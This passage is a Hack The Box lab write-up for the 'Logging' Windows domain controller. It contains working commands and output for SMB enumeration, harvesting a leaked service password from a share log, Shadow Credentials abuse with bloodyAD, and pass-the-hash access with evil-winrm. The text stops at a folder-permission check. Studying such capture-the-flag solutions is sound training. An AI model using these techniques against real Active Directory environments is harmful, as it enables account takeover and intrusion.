---
title: Logging
os: Windows
difficulty: Medium
tags:
  - Active Directory
  - Information Disclosure
  - Shadow Credentials
  - DLL Sideloading
  - ADCS
  - ESC17
  - Rogue WSUS Server
  - Privilege Escalation
---

# 🛡️ HTB - Logging (Medium)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Windows-blue?style=for-the-badge&logo=windows" alt="OS Windows" />
  <img src="https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge" alt="Medium Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** Logging
- **Operating System:** Windows Server 2019
- **Difficulty:** Medium
- **Vulnerabilities:** Plaintext Credentials in Public SMB Share Logs, Shadow Credentials on gMSA Account, DLL Sideloading in UpdateMonitor, ADCS ESC17 (Rogue WSUS Server Spoofing)

---

```text
\------------------------------------------------------------------------------------Logging-Writeup-------------------------------------------------------------------------------------------
```

## Step 1 - Reconnaissance

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.23.177

Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-19 13:54 UTC

Nmap scan report for 10.129.23.177

Host is up (0.22s latency).

Not shown: 988 closed tcp ports (reset)

PORT     STATE SERVICE       VERSION

53/tcp   open  domain        Simple DNS Plus

80/tcp   open  http          Microsoft IIS httpd 10.0

|_http-title: IIS Windows Server

|_http-server-header: Microsoft-IIS/10.0

| http-methods:

|_  Potentially risky methods: TRACE

88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-04-19 20:54:28Z)

135/tcp  open  msrpc         Microsoft Windows RPC

139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn

389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2026-04-19T20:55:38+00:00; +7h00m10s from scanner time.

| ssl-cert: Subject:

| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging

| Not valid before: 2026-04-17T03:20:01

|_Not valid after:  2106-04-17T03:20:01

445/tcp  open  microsoft-ds?

464/tcp  open  kpasswd5?

593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2026-04-19T20:55:39+00:00; +7h00m10s from scanner time.

| ssl-cert: Subject:

| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging

| Not valid before: 2026-04-17T03:20:01

|_Not valid after:  2106-04-17T03:20:01

3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)

|_ssl-date: 2026-04-19T20:55:38+00:00; +7h00m10s from scanner time.

| ssl-cert: Subject:

| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging

| Not valid before: 2026-04-17T03:20:01

|_Not valid after:  2106-04-17T03:20:01

3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: logging.htb0., Site: Default-First-Site-Name)

| ssl-cert: Subject:

| Subject Alternative Name: DNS:DC01.logging.htb, DNS:logging.htb, DNS:logging

| Not valid before: 2026-04-17T03:20:01

|_Not valid after:  2106-04-17T03:20:01

|_ssl-date: 2026-04-19T20:55:39+00:00; +7h00m10s from scanner time.

No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.94SVN%E=4%D=4/19%OT=53%CT=1%CU=44617%PV=Y%DS=2%DC=T%G=Y%TM=69E4

OS:DED2%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=106%TI=I%CI=I%II=I%TS=U)

OS:SEQ(SP=108%GCD=1%ISR=106%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=109%GCD=1%ISR=1

OS:08%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O

OS:4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFF

OS:F%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%D

OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0

OS:%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=

OS:Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y

OS:%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R

OS:%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=

OS:80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z

OS:)

Network Distance: 2 hops

Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:

| smb2-security-mode:

|   3:1:1:

|_    Message signing enabled and required

|_clock-skew: mean: 7h00m09s, deviation: 0s, median: 7h00m09s

| smb2-time:

|   date: 2026-04-19T20:55:28

|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)

HOP RTT       ADDRESS

1   344.82 ms 10.10.14.1

2   344.99 ms 10.129.23.177

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

Nmap done: 1 IP address (1 host up) scanned in 85.79 seconds
```

- 🔍 *A Medium level windows box!*

- 🔍 *we also got some initial creds as well **wallace.everette / Welcome2026@***

- 🔍 *SMB confirmation?*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@'

SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)

SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.everette:Welcome2026@
```

- 🔍 *Now lets dig into some users*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --users

SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)

SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.everette:Welcome2026@

SMB         10.129.23.177   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-

SMB         10.129.23.177   445    DC01             Administrator                 2026-04-16 14:41:53 0       Built-in account for administering the computer/domain

SMB         10.129.23.177   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain

SMB         10.129.23.177   445    DC01             krbtgt                        2026-04-16 14:47:15 0       Key Distribution Center Service Account

SMB         10.129.23.177   445    DC01             svc_recovery                  2026-04-16 23:09:49 0

SMB         10.129.23.177   445    DC01             jaylee.clifton                2026-04-16 23:09:49 0

SMB         10.129.23.177   445    DC01             monique.chip                  2026-04-16 23:09:49 0

SMB         10.129.23.177   445    DC01             kyson.abel                    2026-04-16 23:09:50 0

SMB         10.129.23.177   445    DC01             fable.milford                 2026-04-16 23:09:50 0

SMB         10.129.23.177   445    DC01             wellington.kylan              2026-04-16 23:09:50 0

SMB         10.129.23.177   445    DC01             serina.philander              2026-04-16 23:09:50 0

SMB         10.129.23.177   445    DC01             wallace.everette              2026-04-16 23:09:50 0

SMB         10.129.23.177   445    DC01             toby.brynleigh                2026-04-16 23:09:50 0

SMB         10.129.23.177   445    DC01             [*] Enumerated 12 local users: logging
```

- 🔍 *Now lets look at some shares!*

```bash
nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --shares

SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)

SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.everette:Welcome2026@

SMB         10.129.23.177   445    DC01             [*] Enumerated shares

SMB         10.129.23.177   445    DC01             Share           Permissions     Remark

SMB         10.129.23.177   445    DC01             -----           -----------     ------

SMB         10.129.23.177   445    DC01             ADMIN$                          Remote Admin

SMB         10.129.23.177   445    DC01             C$                              Default share

**SMB         10.129.23.177   445    DC01             IPC$            READ            Remote IPC**

**SMB         10.129.23.177   445    DC01             Logs            READ**

**SMB         10.129.23.177   445    DC01             NETLOGON        READ            Logon server share**

**SMB         10.129.23.177   445    DC01             SYSVOL          READ            Logon server share**

SMB         10.129.23.177   445    DC01             WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
```

- 🔍 *we got read permissions over 4 shares!*

- 🔍 *The interesting share is Logs, the rest of the shares are just default, i thought maybe there would be another script path file to be changed if had any writeable permission. but unfortunately there isn't*

```bash
smbclient //10.129.23.177/Logs -U 'logging.htb\\wallace.everette%Welcome2026@'

Try "help" to get a list of possible commands.

smb: \\> ls

&#x20; .                                   D        0  Thu Apr 16 23:10:09 2026

&#x20; ..                                  D        0  Thu Apr 16 23:10:09 2026

&#x20; Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026

&#x20; IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026

&#x20; Service_State.log                   A      468  Thu Apr 16 23:10:09 2026

&#x20; TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
```

- 🔍 *save them in your machine.*

- 🔍 *take a look at IdentitySync_Trace_20260219.log this log!*

```text
[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 02:45:00.112] [PID:1024] [Thread:01] INFO  - Maintenance: Rotating log files for 'IdentitySync'...

[2026-02-19 02:50:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).

[2026-02-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)

[2026-02-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16GB

[2026-02-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...

[2026-02-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...

[2026-02-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0

[2026-02-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).

[2026-02-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)

[2026-02-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...

[2026-02-09 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - **ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\\svc_recovery", BindPass: "Em3rg3ncyPa$$2025", Timeout: 30 }**

[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.

&#x20;  at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)

&#x20;  at logging.IdentitySync.Engine.LdapProvider.Connect()

&#x20;  --- Server Error Details ---

&#x20;  Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563

&#x20;  Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)

&#x20;  Win32 Error: 49 (Invalid Credentials)

&#x20;  ----------------------------

[2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\\svc_recovery. Checking alternate Domain Controller...

[2026-02-09 03:00:03.650] [PID:4102] [Thread:12] CRITICAL - Domain-wide LDAP bind failure. Task aborted.

[2026-02-10 03:00:03.702] [PID:4102] [Thread:12] DEBUG - Generating SMTP alert for it-alerts@logging.htb

[2026-02-10 03:00:04.112] [PID:4102] [Thread:12] INFO  - Process exit code: 1. Cleaning up session buffers.

[2026-02-10 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-11 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-11 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-11 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-11 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-11 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-11 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-11 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-19 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-19 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-19 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-29 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-29 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-29 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-02-29 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-29 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-02-29 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-02-29 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-03-09 02:55:00.822] [PID:4102] [Thread:01] DEBUG - Integrity check: All module hashes verified (SHA256).

[2026-03-09 03:00:01.442] [PID:4102] [Thread:12] INFO  - Service: logging.IdentitySync.Engine.Internal (v2.4.2.0)

[2026-03-09 03:00:01.458] [PID:4102] [Thread:12] DEBUG - Environment: OS=Microsoft Windows Server 2019, CoreCount=4, Mem=16GB

[2026-03-09 03:00:01.470] [PID:4102] [Thread:12] INFO  - Initializing module [HR-Connector]...

[2026-03-09 03:00:02.215] [PID:4102] [Thread:12] INFO  - Establishing SQL session with HR01.logging.htb...

[2026-03-09 03:00:02.890] [PID:4102] [Thread:08] TRACE - Querying [loggingHR].[dbo].[Employees] where SyncStatus = 0

[2026-03-09 03:00:03.012] [PID:4102] [Thread:08] INFO  - SQL Session verified. Synchronizing 14 records (BatchID: 88AF-01).

[2026-03-09 03:00:03.055] [PID:4102] [Thread:04] INFO  - Validating AD target health: DC01.logging.htb (Port 389)

[2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Initializing LdapConnection object...

[2026-03-09 03:00:03.110] [PID:4102] [Thread:04] TRACE - Success LdapConnection object...

[2026-03-09 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-03-09 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-03-09 03:15:00.448] [PID:4102] [Thread:01] INFO  - Scheduling next sync task for 2026-02-19 06:00:00...

[2026-03-09 03:05:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.

[2026-03-09 03:05:01.210] [PID:4102] [Thread:14] TRACE - Threadpool: 4 active, 0 queued.

[2026-03-09 03:10:00.005] [PID:4102] [Thread:01] INFO  - Heartbeat: Service [IdentitySync.Engine] is RESPONSIVE.
```

- 🔍 *We got Creds for **svc_recovery:Em3rg3ncyPa$$2025***

- 🔍 *Now While looking at the Bloodhound, i found out that*

```text
&#x09;svc_recovery

&#x09;     ↓

&#x09; GenericWrite

&#x09;     ↓

&#x09; msa_health$

&#x09;     **↓**

&#x09;  memberOF

&#x20;	     ↓

&#x20;     Remote Management  (probably will get User Flag!)
```

> [!IMPORTANT]
> What is GenericWrite? Generic Write (GenericWrite) in Active Directory (AD) is a powerful, high-level permission that allows a user or group (the trustee) to modify most, but not all, of the properties (attributes) on a specific AD object, such as a user, computer, or group. Unlike Generic All, which grants full control (including deleting objects or changing permissions), Generic Write focuses on the ability to update data within the object

> [!IMPORTANT]
> Will Do kerberoasting! Kerberoasting: An attacker can write to the servicePrincipalNames (SPN) attribute of a user object to make it a service account, then initiate a Kerberoasting attack to crack the account's password.

- 🔍 *Now lets add svc_recover to msDS-GroupMSAMembership*

> [!IMPORTANT]
> msa_health$ is a Group Managed Service Account (gMSA). gMSAs have auto-rotating passwords managed by AD — but certain principals (users/computers) are allowed to retrieve that password. **That allowlist is stored in the attribute msDS-GroupMSAMembership.**

- 🔍 *Lets attack!*

```bash
bloodyAD -u svc_recovery -p 'Em3rg3ncyPa$$2026' \\

&#x20;        -d logging.htb \\

&#x20;        --host 10.129.23.177 \\

&#x20;        add groupMember msa_health$ svc_recovery

Traceback (most recent call last):

&#x20; File "/home/kali/Tools/bloodyAD/venv/bin/bloodyAD", line 8, in <module>

&#x20;   sys.exit(main())

&#x20;            ^^^^^^

&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main

&#x20;   output = args.func(conn, **params)

&#x20;            ^^^^^^^^^^^^^^^^^^^^^^^^^

&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/add.py", line 391, in groupMember

&#x20;   member_transformed = conn.ldap.dnResolver(member)

&#x20;                        ^^^^^^^^^

&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/config.py", line 132, in ldap

&#x20;   self._ldap = Ldap(self)

&#x20;                ^^^^^^^^^^

&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 206, in __init__

&#x20;   raise e

&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 192, in __init__

&#x20;   raise err

msldap.commons.exceptions.LDAPBindException: LDAP Bind failed! Result code: **"invalidCredentials"** Reason: "b'8009030C: LdapErr: DSID-0C0906F8, comment: AcceptSecurityContext error, data 52f, v4563\\x00'"
```

- 🔍 *Lets Ensure the Creds!*

```bash
nxc smb 10.129.23.177 -u svc_recovery -p 'Em3rg3ncyPa$$2026'

SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)

SMB         10.129.23.177   445    DC01             **[-] logging.htb\\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION**
```

- 🔍 *Also I have found out that svc_recovery is a member of Protected Users OU!*

- 🔍 *Lets Try Getting the TGT for this user and then will proceed*

```text
getTGT.py 'logging.htb/svc_recovery:Em3rg3ncyPa$$2026' -dc-ip 10.129.24.106

Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_recovery.ccache
```

- 🔍 *Ensure!*

```bash
klist

Ticket cache: FILE:svc_recovery.ccache

Default principal: svc_recovery@LOGGING.HTB

Valid starting       Expires              Service principal

04/20/2026 22:15:34  04/21/2026 02:15:34  krbtgt/LOGGING.HTB@LOGGING.HTB

&#x20;       renew until 04/21/2026 02:15:34
```

- 🔍 *Now lets add the account to the read list!*

```bash
bloodyAD -u svc_recovery -k \\

&#x20;        -d logging.htb \\

&#x20;        --host dc01.logging.htb \\

&#x20;        set object msa_health$ msDS-GroupMSAMembership \\

&#x20;        -v 'CN=svc_recovery,CN=Users,DC=logging,DC=htb'

Traceback (most recent call last):

&#x20; File "/home/kali/Tools/NetExec/venv/bin/bloodyAD", line 8, in <module>

&#x20;   sys.exit(main())

&#x20;            ^^^^^^

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main

&#x20;   output = args.func(conn, **params)

&#x20;            ^^^^^^^^^^^^^^^^^^^^^^^^^

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/set.py", line 58, in object

&#x20;   conn.ldap.bloodymodify(

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 315, in bloodymodify

&#x20;   raise err

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/connection.py", line 615, in modify

&#x20;   'changes' : encode_changes(changes, encode)

&#x20;               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 496, in encode_changes

&#x20;   attributes = encoder(value, True)

&#x20;                ^^^^^^^^^^^^^^^^^^^^

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/formatters/formatters.py", line 106, in genericFormat

&#x20;   return origin_format(val, encode, *args)

&#x20;          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 116, in single_sd

&#x20;   x = SECURITY_DESCRIPTOR.from_sddl(x)

&#x20;       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/winacl/dtyp/security_descriptor.py", line 166, in from_sddl

&#x20;   params[np[i]] = np[i+1]

&#x20;                   ~~^^^^^

IndexError: list index out of range
```

- 🔍 *This attribute expects a Security Descriptor in binary format, but the tool is attempting to parse the input string (the Distinguished Name of svc_recovery) as if it were SDDL (Security Descriptor Definition Language). When it fails to find the expected SDDL components, it throws the IndexError: list index out of range.*

- 🔍 *I also tried with add principalAllowedToDelegate to get an upper hand retrieve the password, but it didn't worked. as GenricWrite might not have this attribute to be changed!*

- 🔍 *Now Is there any other way to get the msa_health Password? Well Yes~*

- 🔍 *Shadow Credentials —*

```text
Normal Windows auth flow:

User has password → proves identity to DC → gets access

Shadow Credentials abuses a feature called PKINIT — which lets you authenticate using a certificate (public/private key pair) instead of a password.

Every AD object has an attribute called msDS-KeyCredentialLink which stores trusted certificates for that account. If you have GenericWrite on an object, you can add your own certificate to that attribute:

Attacker generates cert keypair

&#x20;       ↓

Writes cert into msa_health$'s msDS-KeyCredentialLink

&#x20;       ↓

DC now trusts that cert to authenticate AS msa_health$

&#x20;       ↓

Attacker uses private key to get TGT as msa_health$

&#x20;       ↓

Extract NT hash → WinRM in
```

- 🔍 *easy, lets do some action now!*

```text
\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
```

## Step 2 - Initial Foothold!

- 🔍 *As we already have the TGT for svc_recovery, lets try adding shadow creds directly!*

```bash
bloodyAD -u svc_recovery -k \\

&#x20;        -d logging.htb \\

&#x20;        --host dc01.logging.htb \\

&#x20;        add shadowCredentials msa_health$

[+] KeyCredential generated with following sha256 of RSA key: 6b872e5e15c4069dfa9b46b06e10e94d6def5ff6e3c75165fd47d924568cc104

[+] TGT stored in ccache file msa_health$_1J.ccache

**NT: 603fc24ee01a9409f83c9d1d701485c5 #Gold!!**
```

- 🔍 *Well this is interesting!*

- 🔍 *Modern BloodyAD all work for us*

> [!IMPORTANT]
> Context:

```bash
bloodyAD add shadowCredentials

&#x20;       ↓

Generates RSA keypair internally

&#x20;       ↓

Writes cert to msDS-KeyCredentialLink (uses svc_recovery's GenericWrite)

&#x20;       ↓

Immediately performs PKINIT auth using the cert

&#x20;       ↓

Uses the resulting TGT to call KERB-AS-REP and derive NT hash

&#x20;       ↓

Dumps everything: ccache + NT hash
```

- 🔍 *Lets Get shell then!!*

```bash
evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'

&#x20;

Evil-WinRM shell v3.7

&#x20;

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

&#x20;

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

&#x20;

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\\Users\\msa_health$\\Document*Evil-WinRM* PS C:\\Users\\msa_health$\\Documents>
```

- 🔍 *unfortunately no flag :), Also there is no clear outbound object control for this account!*

- 🔍 *Since there is no clear Bloodhound path, we need to enumerate this shell for further pivot*

- 🔍 *As it is a very Restricted shell. because it is a Service Managed Account, it doesn't lets us run Administrative Binaries, CMI/WMI commands, Service Managements and Registry Access AS well.*

- 🔍 *Then lets look for some Installed anomalies, maybe we can find something there!*

```text
*Evil-WinRM* PS C:\\Program Files> ls

&#x20;   Directory: C:\\Program Files

Mode                LastWriteTime         Length Name

\----                -------------         ------ ----

d-----        4/10/2020  11:34 AM                Common Files

d-----        4/16/2026   8:19 AM                internet explorer

d-----        4/16/2026   5:26 PM                Update Services

**d-----        4/16/2026   4:10 PM                UpdateMonitor**

d-----        4/16/2026   6:40 PM                VMware

d-r---        8/24/2021   7:47 AM                Windows Defender

d-----        4/16/2026   8:19 AM                Windows Defender Advanced Threat Protection

d-----        8/24/2021   7:47 AM                Windows Mail

d-----        4/16/2026   8:19 AM                Windows Media Player

d-----        4/16/2026   8:19 AM                Windows Multimedia Platform

d-----        9/15/2018  12:28 AM                windows nt

d-----        8/24/2021   7:47 AM                Windows Photo Viewer

d-----        4/16/2026   8:19 AM                Windows Portable Devices

d-----        9/15/2018  12:19 AM                Windows Security

d-----        9/15/2018  12:19 AM                WindowsPowerShell
```

- 🔍 *Looking at the Files, these are all Standard Windows Files, while the UpdateMonitor might not be a Standard Windows file, it looks like a Third-party anomaly.*

- 🔍 *Now lets see if we can Write this folder?*

```text
icacls "C:\\Program Files\\UpdateMonitor"

&#x20;

C:\\Program Files\\UpdateMonitor logging\\IT:(OI)(CI)(F)

&#x20;                              NT SERVICE\\TrustedInstaller:(I)(F)

&#x20;                              NT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F)

